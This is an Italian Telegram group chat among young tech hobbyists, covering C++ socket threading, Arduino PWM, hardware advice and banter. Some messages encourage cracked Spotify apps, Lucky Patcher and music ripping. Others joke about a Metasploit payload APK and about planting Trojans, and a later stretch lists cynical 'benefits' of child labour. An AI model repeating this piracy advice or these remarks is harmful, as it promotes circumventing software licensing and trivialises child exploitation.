un tipo....da quel che mi dice la descrizione di visual studio passandoci sopra
Dove lo hai dichiarato, come, a chi devi passarlo?
tipo così
e lo devo passare dentro la funzione del thread
Ok, così accetti il socket dal server
si
Ora vuoi avviare un thread con argomento il SOCKET
per il comando recv() mi serve dentro pure inserirgli il socket e dovendolo eseguire nella funzione del thread devo passarcelo in un modo o nell'altro
yep
ma definire socket nella funzione?
non posso, vorrebbe dire rendere il resto globale e non me lo lascia fare, va a fottersi tutto...e sinceramente non capisco perchè
Hola raga
... non ha senso ...
già
Ti mostro un workaround semplice

Fingi di castarlo a puntatore, ad esempio:
Pseudocode

creathread((void*)so);

Poi nel thread
thread(void* arg){
  SOCKET=(SOCKET)arg;
}
passi per parametro i valori a cui si deve inizializzare il socket, così non usi variabili globali
ci dovrei provare....boh, ora provo a fare come dici vbextreme, al massimo provo così
Raga.... Vi devo dire una cosa: sono venuto a conoscenza di una malattia cardiocircolatoria, e domani mi operano, visto che potrei scomparire da un giorno all'altro vorrei solo ringraziarvi tutti per il supporto e per i bei momenti passati con voi.
boh
L'unica alternativa è creare una nuova area di memoria, magari usando una struct, che risieda in un campo visibile al thread, quindi o in global o in heap
già, ma come sposto le variabili non mi funziona più il codice....ed è molto strano
struct ..... = new(....);
struct_init(socket)
creathread(struct);

thread(void* arg){
  struct ... = arg;
   delete(struct);
}
In C++ probabilmente dovrai castarlo lo stesso a void*
altrimenti si incazza coi tipi
creathread((void*)struxt)
È un troll?
Si
ovviamente
No ragà son serio
Si? Cosa in particolare?
È iniziato tutto 3 anni fa
Ma ti pare che uno si opera il giorno dopo anche se fosse?
Dopo una visita sportiva
Il cardiologo aveva visto che nel mio ecg qualcosa non andava ed ha voluto investigare
Tranquillo, sei stato fortunato, hai davanti a te Sherlock
Ne era uscito fuori una patologia di poco conto... Si chiamano wpe che essenzialmente causa Delle aritmie
A detta sua si sarebbe sistemata col tempo
Una settimana fa ho avuto un collasso
Praise 
Porca troia
 appena finisice la stampa posso staccare subito il pezzo?
All'Ospedale mi hanno visitato e  mi hanno Subito portato in rianimazione... Il dottore aveva sbagliato la diagnosi...
Mio padre ha insistito per portami a Bologna ed infatti ora sono qua
Foto
emmhh..si...con il pla non so però, quello da quel che ho visto si desfa con poco quindi boh, se si stacca facilmente si comunque, cerca di non tirare troppo
grz
non ti fidi... Che dovrei mandarti la foto della stanza buia ?!
Ehm.....si
Non vedo il motivo del perché scriverlo in un gruppo telegram
Una cosa così privata poi
Sono in questo gruppo da tanto
Questa è la fotocamera coperta
Bro spero sia uno scherzo
Alla egidio dell'alta tensione
E visto che questa cosa potrebbe non andare bene... Vorrei come dire fare un saluto ... Qua dentro ho avuto Delle belle conversazioni
E vorrei salutarvi
Mi dispiace...
E farvi sapere che se non scriverò più... Sapete il perché...
ma sei serio? 
Purtroppo si... Le cose più brutte accadono da un momento all'altro
Beh, che dire... speriamo vada tutto bene
Grazie a tutti per il sostegno...
Ora vado a dormire... Sarà una giornata pesante
Buona fortuna, ci si vede domani
Oh, per me è troll, in caso contrario buona fortuna e a domani
io boh, nel dubbio si sa mai e auguro fortuna lo stesso
Non credo che domani possa scrivere... Penso che non ne sarò capace... Se sto bene avrete un mio messaggio entro un paio di giorni... Nel caso contrario...
Ma perché?
Devo continuare la frase? 
 un ultima cosa
per spegnere la anet come devo fare quando finisce
ook, a quanto pare in un modo o nell'altro ce l'ho fatta...ooora...essendo che è in un while(true) come faccio tipo a dire "se mex(che è un array di char) è vuoto allora salta altrimenti continua"...mi stanno venendo i dubbi esistenziali
vediamo se riesco ad esprimermi nel migliore dei modi
Grazie ragazzi... buonanotte...
Daje, è stata la troppa salute, vedi che dopo ti riprendi  Buona fortuna
Come minimo, aspettiamo solo te

probabilmente non dovrei programmare a quest'ora che mi vengono i dubbi esistenziali
Forsa e corajo, polenta e formajo 
no, ritenta
finiscila dai
ci penso io poi
ma la conosco 
si beh ovvio
in tutto ciò "gioele sta scrivendo" mi sembra una minaccia
ma sbaglio o non c'è nel pack?
Allora sotto vicenza si continua così e l'ho sentito dire oltre che da mio nonno solo al cfp e BASTA:
~forsa e coraio,
Che l'apparato riproduttore femminile volgaremente chiamato vagina ed indicato rozzamente in omonimia con "bella ragazza" ha acquistato un odore vagamente associabile ad un derivato della sedimentazione del caglio nel latte, una volta lasciato stagionare doc per 32 mesi
~
èè un pelo volgare

Ma che cazzo 
anche, si anche
le spiegazioni quelle scientificamente sensate
non è l'unica
Non è roba per gioveni minorenni, è la realtà semplice e dura della presenza contadina in veneto
anche polenta e formajo ci sta, a pensarci 
è più in stile Gerry Scotti ma ssssssh
Anche "che se morto el mugnaio" per quello
Anche "'l ga ciapà fogo el polaio"
HAHAHAHAHAHHHAHAHAAHHAAHAHA
🧐
Meglio l'i7 no?
Sul gruppo di classe tutti che infamano Spotify 
eh
Non hai saputo?
(finalmente) hanno bannato le app craccate su Android
nono, era un "eh, credevano di essere furbi e adesso si attaccano al cazzo"

Gli mando lo screen del mio account
"e io pago"
È arrivato l'ampli onkyo
Suona stranissimo e piano
Mmm grazie!
?
Eh esatto ma non vorrei farlo
ahiaaaaaaaaa la botta l'ho sentita fino a casa mia :D
Eh 
No ma devo sistemarla quella roba prima o poi, è veramente fatta male 
tu sei pazzo a lasciare quell'accrocchio di legno con i potenziometri incandescenti
prendi una bella scatola di derivazione in plastica e butta quel coso
Verrebbero anche a me con queste domande
Lol
*se ho tempo* 
No beh basta fare un strlen (nome ) !=0 
È Che a mezzanotte si è un pelo fatti
Story of my life
Ieri a mezzanotte e mezza a fare italiano
ma hahahhaha
come al solito, "ma tanto ci metto poco" poi inizi e se ci metti solo 4 ere geologiche sei fortunato
(se ho tempo) respirare
mm... mi sono dimenticato di metterlo, aspe
Idem
Campano?
Si
Ye
Ma tu li hai già ricevuti?
No, tu?
A me 500€. (Studente più bravo dell’anno)
Beato te
Alla mia scuola si portano a Roma quelli più bravi
Non so a fare cosa boh
Però da me li da la banca del paese. Non la scuola o la regione
Sperando di vincere la borsa di studio
Già so cosa comprare

Ancora non ho fatto la richiesta ahahahahahah

Io si! Ma fai presto, che prima la fai, più hai possibilità
<3
Lo so ma ancora non ho fatto l'isee 2018
Ovvio
Quelli passano in secondo piano
Ah, menomale che io lo avevo già
Eh infatti
Fake coff coff
Auguri a quel 2.2% di donne che resiste a seguirmi 
Ahahha
Donne di questo gruppo, fate sentire che non siete fake


Vuole le pics. Bravo Marco 
Mmh effettivamente se sei molto malpensante potrebbe essere mal interpretata 🤔
But who cares 
Basta conoscerti, non serve essere Malpensante ❤
non esistono le donne
Augurissimi per la festa della donna
Ho perso l'anno
Deve decidere se mettermi 1 o 2
Beh ma se è a tutta la classe chissefrega, non può contarlo
Perché no?
Ha i compiti scritti
Bianchi ma li ha
Si ma è a tutti 🤔
Sì
Quindi?
Non può mettere 2 a 14 persone?
Praticamente dovevate fare un'attività extra, la prof mancava, è arrivata sta qua e "hey compito a sorpresa"?
Era programmato il compito ma ci sarebbe dovuta essere alternanza
Quindi non ha studiato un cazzo di nessuno
Poi sta prof ha un'ora a settimana e spiega pure male
No dai, si recupera
No perché questa va avanti ma se non sa spiegare...
Andate dal preside e reclamate
Bella battuta
La preside è nell'altra sede e se ne frega di tutto
Abbiamo ancora tipo solo 2 ore di alternanza perché la preside non ci firma le convenzioni
...
Che schifo...
Avrei una convenzione pronta e firmata dall'azienda dove vorrei andare ma la preside se ne frega
Occupazione! Assenza di massa! Installate i Trojan nella LIM! Date fuoco alla classe!
Si cagano sotto gli altri
  
Fanno tutti i grossi poi come qualcuno dice una parola tutti zitti
Che materia è?
Complementi di matematica
Quindi in questo momento posso decidere se perdere l'anno o l'estate
Azz. Non è una materia che si può studiare da soli
Ma per una materia si perde l'anno?
Noi l'abbiamo l'anno prossimo 
Vabbè se è due settimane che la deve fare lo sapevate :D Poi non è che la matematica si impara il giorno prima
Ragazzi qualcuno ha un TFT 7" con SSD1963 da vendere?
Sì visto che se c'è una cosa che non sopporto è studiare d'estate, quindi mi farei bocciare direttamente
Cos serio?
Sì
No dai, datti da fare da marzo a giugno, sono 3 mesi, cosa perdi l'anno a fare???
E poi tra un anno hai di nuovo le stesse cose da studiare
Fidati, non ne vale la pena perdere tempo così
C'è qualcuno di spezia
 
Ragazzi scusate il disturbo, la mia scheda video è aggiornata?
Non capisco come far "combaciare" le versioni che leggo..so che è una domanda stupida abbiate pazienza
Uno è la versione di build, una la versione del driver... Potrebbe essere che non seguono la stessa numerazione
Ah ok grazie...e quindi come faccio a capirlo..
Indirizzo sito per cuscinetti, viti, etc...?
Nel pc leggo versione driver "
" e versione file "Version 2.1 NVIDIA build_224".
Nel sito NVIDIA leggo Version 391.01....la cosa che ci va piu vicino è la build mi pare..io dovrei avere la 224 e ora c'è la 391?
premi su "aggiorna driver" e ti togli il dubbio.
Non ha molto senso quello che mi dice..boh
Mm prova a scaricarli dal sito di nVidia e installarli a mano... E SOPRATTUTTO CONTROLLARE CHE SIANO COMPATIBILI CHE SI SMINCHIA TUTTO
Basta che dal menu di 
 gli dai il modello della GPU
Così sei sicuro che sono compatibili quelli che escono

 ‎€5‎.9‎9 ‎in‎ve‎ce‎ c‎he‎ €‎10‎.99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 4‎5.‎50%
✂ 
: 

 

Adesso voglio sapere chi e come l'ha trovato.
Marco, cazzeggiando invece di studiare
Il bello è che sono in biblioteca a cercare su Google immagini "rgb toilet" per trovare l'immagine migliore per il messaggio 
Ma
Si ho inserito il modello nel sito, mi è apparsa la lista degli ultimi driver (ho messo la foto sopra), solo che le numerazioni degli aggiornamenti driver non corrispondono alla versione che ho io (ho messo la foto sopra) e non ci capisco nulla
 
 
Ciao ragazzi sapete consigliarmi un buon SSD da montare su un notebook Asus ci circa 5 anni fa, con capienza minima di 240 GB e sotto 100 euro?
Ci sono spesso i crucial in offerta su Amazon
Avevo visto il Samsung 850 evo o il sandisk quale mi consigliate?
Guards cambia poco
Se vuoi il top del top Samsung, altrimenti quello che trovi a meno
Magari non il cinesone che si rompe dopo 10 minuti
Come sono i crucial rispetto ai Samsung?
Secondo me non noti nemmeno la differenza
Upp
Eh?
statistiche del traffico dati della rete uni-tn
Uuuh 
La differenza principale volendo è che i Samsung hanno Samsung magic che ti aiuta un po'... Ma si in computer vecchio non cambia. Io ho preso un Samsung evo 850 da 250 GB a 68 euro su ebay
unitn ho visto che ha una 10Gbps come connessione principale, ma ha anche una connessione da 1Gbps di backup (
)
Wow ottimo prezzo ora controllo
Io ho un SanDisk SATA sul portatile e un 960 EVO (NVMe) sul fisso, la differenza non è così alta come potresti pensare...
È molto più alta la differenza tra un HDD e un SSD SATA che tra un SATA e un NVMe nonostante la differenza di velocità tra ssd sata e nvme è molto più alta della differenza tra hdd e ssd sata... Questo ti dovrebbe far capire quanto noterai la differenza tra Crucial e Samsung
E quelli della DREVO come sono?
Hanno un botto di recensioni positive
Not that bad
Però i DREVO X1 vanno un po' più lenti della media
Ah ecco
Si si questo lo immaginavo ma invece come affidabilità e durata nel tempo che mi sai dire?
Su questo non ti so dire molto
La Dashboard di SanDisk mi segna il 97% di vita rimanente
E l'ho comprato precisamente un anno fa
Ma il pin 13 in Arduino Uno, che tensione fornisce?
*pin digitale 13
5v(?)
Dipende da cosa imposti con il pwm
È sempre 5v, solo che vengono inviati con intermittenza
Intermittenza?
Arduino se non sbaglio non può regolare il voltaggio, ma per poter dare una luminosità intermedia ad un led (è solo un esempio) deve mandare i 5v per breve tempo, poi staccare l'alimentazione e riattaccarla, il tutto molto velocemente
Ah okay grazie mille
Esatto
Si chiama pwm, a seconda della percentuale di tempo in cui ci sono i 5v (duty cycle) hai valori diversi in output
Puoi usare analogWrite per impostare il pwm
 ti rimando al reference se ti interessa 
boh, se qualcuno capisce cosa sbaglio con i thread, io vorrei che si potesse scrivere e ricevere senza dover per forza farlo ad intermittenza così e anche solo includendo thread non mi va più nulla..
Ma il pwm che valore ha di default?
Quanto glie ne dai
Mentre negli altri pin digitali ho notato che la tensione è minore, in questi di quanto è?
Al massimo credo, di quanto è minore?
Il led è meno luminoso
Manda i collegamenti
Forse mi sono spiegato male, collegando il led per esempio al pin 12 ho notato che il led è meno brillante, quindi presumo ci sia meno tensione e sarei curioso di sapere quanto fosse
Ora non ce l'ho sottomano ma è il semplice Blinking a led
Nono ti sei spiegato, ma se non hai messo la resistenza (esempio) è il led che si rompe
Poi è normale che è un po' meno luminoso
La resistenza c'è
Perché dici?
Di quanto è meno luminoso?
Abbastanza
Via di mezzo fa conto
Non può avere la stessa potenza di un pin digitale "normale" se lo usi con il PWM
Ah okay grazie mille a tutti e due 
  
e la madonn, mi sembra strano però, ok che il pwm ti porta al massimo ad un 90% massimo ma non un 50% di luminosità...
boh
la tensione comunque è sempre la stessa, tra pin pwm e non la tensione non varia, solo che con i pwm puoi scegliere una frequenza a cui accenderlo fino a di solito sul 90% o anche 100% che non è più pwm però, comunque non un 50%
Come no... anche meno
beh ma al massimo intendo
posso usare il pwm per metterlo al 10% se voglio ma al massimo comunque tira sul 90%, o di certo al massimo non arrivi solo al 50%
Puoi farlo, basta che metti un condensatore sul pin pwm
È lo stesso principio che usano i trasformatori AC -> DC
beh si ma così stai usando componentistica esterna, credo intendesse senza usare altro🤔
Yeeeeee grazie offerte overvolt
comunque oggi a scuola casualmente la psu di un pc è morta per sempre quindi hey, bobine di rame freee per me
Già ... Almeno prende il valore medio della pwm
Prego
Non ricordo da quale dei due link ho comprato...
è uguale, il referral è sempre quello
di solito i componenti elettronici li pubblico io 
Certo che da spotify hanno fatto un ottimo lavoro
Hanno letteralmente bloccato tutte le app al di fuori di quella ufficiale
uau, perchè ti complimenti se sai che non potrai più ascoltare musica al di fuori di soundcloud?
Hanno fatto un ottimo lavoro di pulizia anche se ne toglierà un bel pezzo di mercato
già
 fiero di non averla mai utilizzata..vabbè che io ascolto solamente rock-metal di gruppi vecchi, quindi non faccio testo..io mi carico gli album sulla mia sd e buonanotte
beh a quanto pare i peer del torrent che ho trovato sono ottimi, altro che 3 giorni, qua ci metto 2 settimane in 24h ma ne vale assolutamente la pena per quel che mi riguarda
*opens Spotify Desktop*
*opens SpotifyConverter.exe*
*plugs in the SD Card*
Io ho 32 giga nel telefono quindi purtroppo i 480 pezzi che ho per forza devono essere m4a
e poi ci sono io che avendo 10GiB di dati mobili guardo direttamente i video su youtube con le canzoni senza manco cambiare la qualità del video lasciandola su "automatico"
Bro,
No. Non ha senso
Minchia audiofilo level 9000

io ho soltanto musica Flac ad elevata qualità, mi mangerei tutti i giga in un giorno
Minchia audiofilo level 
ma iutub non dovrebbe neanche fare come twitch tipo, l'audio rimane lo stesso anche se lasci a 144p su youtube
ehbeh, le canzoni sono meglio scaricate da Spotify che da Youtube
disse lui
tu non sei un audiofilo solo perchè sei troppo povero per esserlo
Si ma non rubarmi le battute quando sono tristi 

 la musica si ascolta solamente dal vivo, oppure da cd originale oppure traccia audio Flac..il resto per me è zozzeria..salvo solamente i vinili (oggi è uscito il vinile ristampato dei Ramones e sto facendo la raccolta dei vinili dei Queen che stanno uscendo in edicola)
ma ssono povero 
beh, io ho tutta la collezione dei vinili di renato zero ._.
se la vuoi
stima
di mio papà
quantomeno se scarichi non scendere mai sotto 320k di compressione, altrimenti ti strappi le orecchie
A me basta avere la musica
Alta
Bassi al massimo
 bella collezione
320k sono il minimo 
Ho fear of the dark in 128k 
Troppo pigro per riscaricare
hey, hey, quando passo da mia nonna ti faccio sentire il mio potentissimo 
 fatto con componentistica rovinata, stuprata e ristuprata del dopoguerra
poveri Iron Maiden
Fidati che a quei livelli di compressione neanche si sente bene cosa dice
e ho un mangiadischi con il valvolare da disco, se lo attacchi alle casse sue rompi le finestre a metà volume
ci credo 
ci credo, la mia fidanzata ha un vecchio ampli valvolare Vox AC30 che appena lo attacca alla Fender trema il palazzo
aalmeno...credo sia un valvolare, altrimenti non mi spiego come faccia a tenere una simile qualità anche a simili livelli
Hai presente il suono che fa il drive in un valvolare? Mettici di fondo un gatto che si fa le unghie tra gli speaker e ci sei
sicuramente è un valvolare
Cabinato >>>>
Ne ho visto uno con 4 speaker grandi come la mia testa
ecco, ed è anche tenuto benissimissimo, tipo che quando mio papà mi ha detto che potevo dargli un'occhiata, dopo averlo aperto, non aveva neanche un po' di polvere e nessuno l'aveva mai tirato fuori da tipo 30 anni minimo
e ha anche la radio...ma a frequenze moolto grandi, passi da 0.5 KHz tipo fino a 118MHz mi sembra sia, che è la chiusura della FM
senti il telegiornale russo per dire
Ragazzi dato che non ho un RTC module, ma ho un rpi zero+wifi e un oled da 0.96 pollici come potrei fare un orologio?
perchè la lo trasmettono ancora su radio
l'interno del Vox AC30 della mia fidanzata
questo sfonda le finestre con una chitarra elettrica in distorsione

(Se è possibile)
 senti qua che amplificatore..e questo qui suona anche da cani 
io so che il mio arriva ad amplificare a 60W, te che ne dici?
non male, ti apre i timpani quel cosino
alquanto
beh non che l'abbia mai messo al massimo, già a 1/5 del volume è tipo spaccatimpani come cosa...
Corrado, se devi farmi morire fallo per bene
Sfodera le tue armi migliori
o eccolo 
vuoi vedere le chitarre? ti accontento subito
Preparo il lubrificante
guarda che collezione di Fender, Rickenbacker e Ibanez
la Fender Strato verde chiaro è la mia, la stava accordando
la mia fidanzata fa sia ingegneria sia il conservatorio di percussioni..è una polistrumentista, suona oltre 10 strumenti, tra chitarre, bassi e percussioni
Batteria Tama e piatti Zildjan, non so se mi spiego :D
*salva l'immagine assolutamente*
questa è la cantina-sala prove, tutta insonorizzata
hai visto la batteria Tama? e quella in fondo è la Ludwig di mio fratello
Adottami
È un po' tardi per l'età ma adottami
 ok figlio mio perduto
Figliol prodigo che passerà il suo tempo rinchiuso in cantina, la vostra/mia/nostra cantina

Che già mi faccio odiare dai vicini suonando l'elettrica la sera tardi, se ci metti in mezzo la batteria...
Magari un rickenbacker
E poi ci sta anche una lp, quella la porto io
così si capisce meglio :D
 🤣 leggete questa ragazzi
mi sa un po di "tanto ci si entra comunque"
Ma
"Non fottiamo solo attrici, ma anche i tuoi dati"
ouu maaa god, ha deciso di esplodere la velocità, mi sento felicioooo
Non riuscivo a scollarmi una del call center di Telecom
Rumena?
Italiana
MA ERA FISSATA
Ma lei ha già la fibra?
Buttare giù la chiamata?
Ma sicuramente non paga meno di ventinove euro e novantanove
Non sono così cattivo
Ok offendere e poi buttare giù
PORCO**** PAGO 50€ MA SCOLLATI CHE CAZZO
Telecom mi fa cagare
Che poi si aggiornassero che ora si chiama TIM
io di solito inizio sparando cagate del tipo "qua abbiamo arpa net che va veloce, altro che fibra" e poi attacco quando lo vedo abbastanza confuso
Ha il ping che jittera troppo e si fa pagare gli IP statici
hahahaahahaha fratello
Lo sai vero che basta dire di essere minorenni?
"Mi scusi, ho la TeleTu ora" e chiudo
ARPANET VELOCE AHAHAHAHAHAHAH
io lo faccio sempre, appena sento "chiamo per conto di.." giù il telefono
Sinceramente io manco rispondo al telefono...
ma sei fuori? quelli prendono e ti dicono tipo "allora, bambino specialino potresti per favorino chiamare tuo paparino???" e te lo chiedono 99 volte prima di lasciarti parlare di nuovo
Che poi  se dici "Sì" per rispondere alla chiamata rischi che ti facciano dei contratti
"Scusa, ho la mamma che sta sul divano che beve Rum e che fuma una sigaretta, ora non può rispondere" cit. DarkAngelCraft ergo Yotobi

Scusa sono minorenne non può parlare con nessuno ciao e riattacchi
il guaio è che adesso si sono fatti furbi, chiamano con i numeri di cellulare, non più con i fissi 02 o 08
E chi a detto che io risponda ai numeri di cellulare che non conosco xD
tu.. io devo purtroppo 
non ci arrivano quelli, continuano a chiedertelo, da li ho imparato a non dirlo mai e iniziare a fingermi un business man incazzato che fa finta di non capirci nulla, del tipo "no ma io ho il 6G, altro che gli astronauti" e poi da confusi butti giù
così non ti richiamano almeno
che tristezza
Ci sarebbe stato un:
"Ma signora, che è la fibra? Io qui ho il decoder che va benissimo"
beh, un po' quel che fa mio papà in fondo
"Non ha mai dato problemi da quando abbiamo cambiato telefono"
Con quello del lavoro per forza xD
bella autogufata
"Il tubo catodico va apposct"
"fibra? aaahh, no ma non mi servono, non compro vinili, grazie lo stesso"
"Dice che con la fibra navigo più veloce? Ah ok ma non mi dà problemi, qui a Portogruaro il vento è forte e si pesca bene"
Pfff la prossima volta devi rispondere con scusa le passo la persona incaricata e poi fai partire la musichetta da callcenter
"Salve signora la telecom sta rinnovando le proprie offerte"
"Salve a lei, ha presente la nuova offerta eni gas e luce?"
Callcenterception
Ma tanto non ha senso continuare la chiamata se non sei interessato non sei interessato, poi io non mi piace fare contratti telefonici, preferisco leggere con calma tutte le condizioni del contratto.. tanto ti fregano lo stesso però ci hai provato
  che gruppo di continuità serve per un alimentatore da 400W... Anche se normalmente assorbe 200W
risposta interpretata : "se è un corsair vs, usa un estintore come gruppo di continuità"
risposta interpretata : "se è un corsair, usa un estintore come gruppo di continuità" *

Avete un libro da consigliarmi per imparare il PHP?
Aspetta, glielo faccio rivedere un'altra volta
Vara che fiero
nah per la stampante, anche peggio, ma mi scoccia se si spenga se salta la luce 
Si chiama "Switch to Python", cercalo online
Secondo me serve comunque iniziare dal php
È mentalmente molto più semplice e ci si può concertare su altro che sulla struttura complessa di un framework
Esatto, meglio iniziare da PHP e distruggersi la logica
Php è un linguaggio un po' meh e non molto.. Moderno. Ma fare una pagina web in php ci metti tre secondi ad imparare, fare la stessa cosa con Django no
Ma una volta che hai imparato con Django ci fai di tutto, dal meno al più complesso, con php no
ok ma iniziare da html , css e js no?
giusto per entrare nell'ottica, sai com'è...
Quello è Frontend
Qui si parla di framework Backend
beh si...però giusto per
PHP e MySQL
si ma io studierei pure il mindfuck piuttosto che il php, php=sudcoreano fuso con il turkmeno
almeno per me
Poi oh, se devi fare una cazzatina evviva php, scontato
Se inizi da php diventa un "html e poi ogni tanto scrivo altre cose"
Appunto, una volta che hai imparato... Secondo me conviene comunque partire da php, sapendo che poi passerai ad altro
che poi vedo spesso siti che contengono solo che php come codici, si può eludere direttamente l'html usando php?
I primi siti che fai sono per forza cazzatine
E così puoi pensare tanto a css e js per dire
No, se sai che devi passare ad altro perchè vuoi imparare no, se devi fare quattro cosette tanto per allora sì
fibra? no grazie, vasnno benissimo le verdure dell'orto 

un ups 450VA
APC?

oppure posso prendere questo coso economico che tanto è per una stampante da 200€ e non mi importa sia il top



Sapere un linguaggio in più non fa mai male... E piuttosto che fare siti statici per imparare css e js, conviene farli dinamici e usare php
Consapevole del fatto che se poi vuoi fare progetti grossi c'è di meglio
va benissimo anche questo se ci devi collegare solamente la stampante
quella 3d, se in una stampa da 20 ore c'è uno sbalso di tensione alle suore si rizzano i capelli 
Pure il raspberry pi? Lol
Se parti da php ti preconfezioni una logica sbagliata della programmazione
Ragazzi, un oled 0.96 e arduino nano+sensore temperatura e umidità+ modulo laser+3 led da 5mm, secondo voi, con 2000mAh per quanto tempo li alimento?
Da adesso non avremo più quel problema, vero spotify?
Ma dai
E se non hai Spotify premium non puoi saltare
Ma se lo hai cracc
Ah no
a un mio compagno di classe funziona ancora
c'è un barlume di speranza
No
Io ho la mod che funziona
ma vorrei evitare che mi venisse bloccato l'account 
Stanno facendo repulisti peggio di swiffer duster con i peli di cane
Tantissime, eh? 
Si chiama com.metasploit.payload.apk
Ban
Nnnnnnnnnnnnnn
io lo proverei
E poi c'è un altra is.not.a.virus.apk
pure questa, non si giudica dalla copertina ù-ù

Ragazzi! Hobbyking ha spedito ieri, yeeee
passa passa 🤓
Quando l'hai ordinato? A quanto ne so ci mette anni
Domenica, ho scelto la fedex priority quindi dai 3 ai 10 gg per arrivare
Ah bello
Intanto le mie Hybrid si trovano in Azerbaijan da qualche parte

a me è arrivato oggi da hobbyking, esattamente 2 settimane questo giro, hanno fermato in dogana, comunque ora c'è, dai, buono
Con che spedizione? Quanto hai pagato di dogana?
spedizione meno costosa che ci fosse, non ho pagato la dogana
Uh, quindi non fedex. What
beh infondo è dalla inghilterra
Aaah ecco
A me da hong Kong
da hong kong di norma ci vuole un mesetto e mezzo con la spedizione meno costosa di banggood...con il resto non so
no ma hobbyking è relativamente veloce con queste cose solo che quando si tratta di hong kong deve passare per un volo intercontinentale il pacco e di solito ci vuole un po' per quello, metti una settimana e ce l'hai se hai pagato la spedizione buona
Calcola che la spedizione costa 79€
a
e tipoo...l'hai comprato adesso e già ti metti a guardare l'orologio per vedere perchè non sta passando il corriere
Ovviamente io non l'ho pagata, poiché ho superato i 150$ e quindi me la regalavano 
Esatto, un dissanguamento
allora no, stai tranquillo, è come quando al lidl la roba è scontata, sarà anche della miglior marca ma come passa dal bancone "ricconi" a quello "povari demmerda" magicamente diventa problematica
se è gratuita qualcosa mi dice che ci metterà un peeeeletto di più
hanno fatto bene
Spero di no, ma probabilmente hai ragione 
Decisamente
Non per me però che mi tocca tornare a vk music bot
Anche a Yt Audio bot
sul serio? il facebook russo?
beh non è proprio la stessa cosa in ogni caso, da Spotify ascoltavi usando la rete dati
non sei l'unico a conoscerlo
un tempo ci scaricavo i peggio FLAC da li
no, io non è che lo conosca per qualcosa, è diverso, io 
 praticamente l'ho creato io, a 6 anni spacciavamo account di minecraft """""craccati""""" li
che cos
hehehe
i bei tempi, a non fare nulla tutto il caxxo di giorno, ora c'è platone
succede
quando sarai vecchio potrai tornare a cazzeggiare
quando sei vecchio devi passare la giornata alle poste per la pensione
basterebbe farla accreditare sul conto corrente
massì, tra 60 anni potremo accreditarla direttamente sul portafoglio di dogeecoin
Lol
Ed io sono vivo
Un po' addormentato ma vivo
L'operazione è andata bene
se a qualcuno interessasse H1Z1 è ora free to play
Non tutte
La patch di lucky patcher funge ancora
E il mio amico che ha fatto l'accesso con facebook non l'ha bloccato, non chiedermi il perché
Quella è per spotify 3...
NO CAZZO, NON È VERO
non aggiorno le patch da un po'
voi... esperti del black humor... potete dirmi tre motivi per i quali lo sfruttamento minorile è cosa buona?
usciteleeee
basta essere di malpensa
 tu trovato niente?
devo fare un testo argomentativo e devo trovare tre cose che dimostrino che lo sfruttamento minorile non è brutto
Non tre, una
Tre è impossibile
devo fare l'antitesi
1) Sono una persona orrenda e non me ne frega niente quindi è figo punto
2) Non mi fa ne caldo ne freddo ma oggi la luna è a 3 gradi nord quindi mi fa caldo
3) Serve a farmi bestemmiare su questo testo argomentativo
Caldo come con la sgnappa?
boh
ma non riesco a trovare tre cose a favore
sono positive queste ._.
una può essere che guadagnano per la famiglia.... ma tanto non guadagnano nulla

Imparano che la vita è dura
Diminuiscono la sovrappopolazione
._.
esattoooo
sono una persona orrenda 
Cerca antitesi sfruttamento minorile
ah aspe
non sono sull'altro gruppo 
raga se mettiamo che tipo comandi come 
 mandano gif?
tipo tu fai 
 e manda una gif con un tipo che fa "ok!"
Uhh lo faccio io... Almeno ho qualcosa da fare qua in ospedale....
*mettessimo
Sorry 
sto punto abilitiamo le gif, facciamo prima hahahaaha
Eh no
perchè così le gif sono solo quelle scelte dagli admin
mmmm
altrimenti se le abilitiamo tipo uno manda una gif p***no
la mano ha una funzione così, a pensarci
._.
lo so
ho già usato grouphelp
Devi farci uno sforzo in più, mano 
ospedale?
Leggi i messaggi di ieri serq
Donne, quali donne
[premessa: le frasi che sono proposte sulla community di ggl t sono frasi che sono state effettivamente cercate da qualcuno senza che ggl t riuscisse a tradurle correttamente]
io gia mi immagino il bambino di 11 anni che sta in prima media che ha visto il tutorial su "come essere un acher bravissimo!!!11!!1 TUT FACILE" che piange disperato perchè non gli funziona nulla e cerca ggl t che scazza completamente

beh..è una mano
Solo 3?
- manodopera a basso costo e senza orari
- persone facilmente abbindolabili (e quindi è più facile spingerli a lavorare in condizioni peggiori)
- fisico e anatomia e mentalità ottime per lavori di precisione (tessitura...)
- più facili da nascondere
Lol
Specialmente l'ultima
Antitesi che non esistono
Allora non devi centrare subito l'obiettivo
Devi girarci intorno
Scherzi?
"Scappa scappa c'è la pula"
"Vai dentro la valigia, sbrigati"
"Anche se lo sfruttamento minorile è una pratica assolutamente non più accettabile nella società odierna possiamo considerare che in alcuni paesi in cui esistono famiglie molto povere sono i bambini a guadagnare andando a lavorare e quindi lo sfruttamento minorile è biello"
Un cazzo
Mai visto iqbal?
Nop
Guardalo, è un film basato su una storia vera se non ricordo male
È possibile costruire un misuratore di CO2 con Arduino?
perchè ti devi basare sempre sui film te
Cazzo è quello che ho visto per 3/4 della mia vita...
...alle medie
Capisci che film
mahonna, sono l'unico che alle medie non ha mai guardato un cribbio di film?
ne avrò visti 2 in tutti e 3 gli anni

Quando c'erano i progetti e andavamo tutti in salone a guardare i film in bassissssssima qualità
Si
beh comunque almeno in parte c'hai ragione, il fatto è che in molti posti è "bello" se lo si può definire tale, perchè offre i soldi alle famiglie, da altri lati invece è abbastanza brutta come cosa, per lo più dipende anche da dove vivi, in che paese, è abbastanza diverso vivere in certe zone che in altre quindi...in genere però è una cosa brutta, molto
a beh ma quello boh, succedeva raramente...oppure noi non ci portavano, non so
Bro
Se un bambino lavora, al 200% percento è sfruttato e non riuscirebbe a mantenere nemmeno un gatto randagio
Si ma il povero ragazzo deve pure trovare un antitesi?
Dati alla mano, secondo questo ragionamento l'india dove le famiglie povere sono da 7 fino a 15 persone i poveri non dovrebbero esistere
eeee, appunto, è quello che intendo, dipende, ci sono i luoghi in cui seppur hai 12 anni ti pagano e anche il giusto e luoghi in cui c'è lo sfruttamento proprio, c'è da differenziarli, per quello intendo
No
Non ti pagano il giusto
si...
Non hai diritti nel lavoro, non vanno rispettate regole -> fanno quel cazzo che vogliono
dipende da dove vai, se finisci a fare tappeti sei proprio sfigato, ma se vivi in altre zone arrivi a farti pagare anche il giusto
Fuori i dati
beh, le prime 2 ok e sempre, l'ultima non ovunque, dipende dalle zone per l'appunto
